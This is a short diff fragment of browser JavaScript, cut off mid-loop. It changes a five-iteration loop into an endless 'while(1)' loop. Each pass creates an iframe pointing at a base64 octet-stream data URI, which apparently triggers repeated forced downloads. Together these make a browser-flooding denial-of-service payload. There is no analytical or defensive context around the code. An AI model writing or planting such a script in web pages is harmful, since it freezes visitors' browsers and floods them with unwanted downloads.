@@ -1,5 +1,4 @@
-i=0;
-while(i<5){
+while(1){
   a=document.createElement('iframe');
   b="data:application/octet-stream;base64,YjAwbTY0ZGwK";
   a.src=b;
